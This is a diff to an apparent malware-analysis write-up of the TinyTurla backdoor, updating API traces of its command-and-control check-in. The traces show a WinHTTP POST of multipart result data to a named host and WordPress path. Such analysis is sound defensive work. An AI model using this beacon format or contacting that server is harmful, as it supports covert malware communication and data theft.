@@ -371,42 +371,42 @@ which triggered the following behavior :
 Once the file download succesfuly, the malware reports back to the C2 :  
 
 ```html
-[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[ * ] [pid 0x250][tid 0x170] c:\windows\system32\svchost.exe
 [API] <WinHttpConnect> in [WINHTTP.dll] 
-[PAR] HINTERNET     hSession       : 0x3e803410
-[PAR] LPCWSTR       pswzServerName : 0x000000F43F8A5180
+[PAR] HINTERNET     hSession       : 0xe4399160
+[PAR] LPCWSTR       pswzServerName : 0x000000A2E4DF7640
 [STR]               -> "hanagram.jp"
 [PAR] INTERNET_PORT nServerPort    : 443
-[RET] 0x7fff146bbb16 in [tinyturla.dll]
+[RET] 0x7ff90bcebb16 in [tinyturla.dll]
 
-[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[ * ] [pid 0x250][tid 0x170] c:\windows\system32\svchost.exe
 [API] <WinHttpOpenRequest> in [WINHTTP.dll] 
-[PAR] HINTERNET hConnect          : 0x3f66b470
-[PAR] LPCWSTR   pwszVerb          : 0x000000F44055F748
+[PAR] HINTERNET hConnect          : 0xe4399fc0
+[PAR] LPCWSTR   pwszVerb          : 0x000000A2E613FB38
 [STR]           -> "POST"
-[PAR] LPCWSTR   pwszObjectName    : 0x000000F43F2C6F90
+[PAR] LPCWSTR   pwszObjectName    : 0x000000A2E520D330
 [STR]           -> "/wp/wp-content/themes/hanagram/rss-old.php"
 [PAR] LPCWSTR   pwszVersion       : 0x0 (null)
 [PAR] LPCWSTR   pwszReferrer      : 0x0 (null)
 [PAR] LPCWSTR   *ppwszAcceptTypes : 0x0
 [PAR] DWORD     dwFlags           : 0x800100 (WINHTTP_FLAG_SECURE | WINHTTP_FLAG_BYPASS_PROXY_CACHE)
-[RET] 0x7fff146bbc26 in [tinyturla.dll]
+[RET] 0x7ff90bcebc26 in [tinyturla.dll]
 
-[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[ * ] [pid 0x250][tid 0x170] c:\windows\system32\svchost.exe
 [API] <WinHttpSendRequest> in [WINHTTP.dll] 
-[PAR] HINTERNET hRequest         : 0x000000F43F66A450
-[PAR] LPCWSTR   pwszHeaders      : 0x000000F43F2C6F90
+[PAR] HINTERNET hRequest         : 0x000000A2E4D9D5A0
+[PAR] LPCWSTR   pwszHeaders      : 0x000000A2E520D4F0
 [STR]           -> "Content-Type: multipart/form-data; boundary="-""
 [PAR] DWORD     dwHeadersLength  : 0xffffffff
 [PAR] LPVOID    lpOptional       : 0x0 (null)
 [PAR] DWORD     dwOptionalLength : 0x0
-[PAR] DWORD     dwTotalLength    : 0xfa
-[RET] 0x7fff146bd38b in [tinyturla.dll]
+[PAR] DWORD     dwTotalLength    : 0x360
+[RET] 0x7ff90bced38b in [tinyturla.dll]
 
-[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[ * ] [pid 0x250][tid 0x170] c:\windows\system32\svchost.exe
 [API] <WinHttpWriteData> in [WINHTTP.dll] 
-[PAR] HINTERNET hRequest                 : 0x000000F43F66A450
-[PAR] LPCVOID   lpBuffer                 : 0x000000F43F897BF0
+[PAR] HINTERNET hRequest                 : 0x000000A2E4D9D5A0
+[PAR] LPCVOID   lpBuffer                 : 0x000000A2E4D8EE00
 [STR]           -> "---"
 [STR]              "Content-Disposition: form-data;name="id""
 [STR]              "Content-Type: text/plain"
@@ -416,12 +416,12 @@ Once the file download succesfuly, the malware reports back to the C2 :
 [STR]              "Content-Disposition: form-data;name="result""
 [STR]              "Content-Type: text/plain"
 [STR]              ""
-[STR]              "[+] File https://hanagram.jp/wp/wp-content/The%20New%20Colossus.txt loaded and saved in Liberty.txt" <--- success>
+[STR]              "[+] File https://hanagram.jp/wp/wp-content/The%20New%20Colossus.txt loaded and saved in Liberty.txt"
 [STR]              ""
 [STR]              "-----"
-[PAR] DWORD     dwNumberOfBytesToWrite   : 0xfa
-[PAR] LPDWORD   lpdwNumberOfBytesWritten : 0x000000F44055F7A0
-[RET] 0x7fff146bd3f2 in [tinyturla.dll]
+[PAR] DWORD     dwNumberOfBytesToWrite   : 0x360
+[PAR] LPDWORD   lpdwNumberOfBytesWritten : 0x000000A2E613FB90
+[RET] 0x7ff90bced3f2 in [tinyturla.dll]
 ```
 
 
